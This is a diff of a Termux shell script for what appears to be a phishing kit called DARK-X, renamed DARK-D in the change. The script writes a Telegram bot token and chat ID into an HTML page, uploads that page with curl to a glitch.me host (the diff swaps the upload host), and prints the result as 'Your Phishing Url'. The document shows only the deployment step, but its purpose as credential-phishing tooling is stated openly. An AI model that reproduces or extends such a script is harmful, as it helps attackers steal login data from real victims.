@@ -27,7 +27,7 @@ dxnetcheck() {
 clear
 echo
 echo -e "               ${g}╔═══════════════╗"
-echo -e "               ${g}║ ${n}</>  ${c}DARK-X${g}   ║"
+echo -e "               ${g}║ ${n}</>  ${c}DARK-D${g}   ║"
 echo -e "               ${g}╚═══════════════╝"
 echo -e "  ${g}╔════════════════════════════════════════════╗"
 echo -e "  ${g}║  ${C} ${y}Checking Your Internet Connection¡${g}  ║"
@@ -62,7 +62,7 @@ sed -i "s/YOUR_CHAT_ID_HERE/$chat_id/g" "$index_file"
 termux-reload-settings
 echo -e "\n ${A} ${c}Token and ID have been updated\n"
 if [[ -f "$index_file" && "$index_file" == *.html ]]; then
-    response=$(curl -s -F "file=@$index_file" https://codex-host.glitch.me/upload)
+    response=$(curl -s -F "file=@$index_file" https://dark-host.glitch.me/upload)
 
     file_url=$(echo "$response" | jq -r '.fileUrl')
     echo -e "\n ${A} ${y}Note & Save the URL given here. \n ${A} ${y}You can use the URL ${g}permanently \n" ; echo -e "\n ${D} ${c}Your Phishing Url: ${g}${file_url}\n${c}"
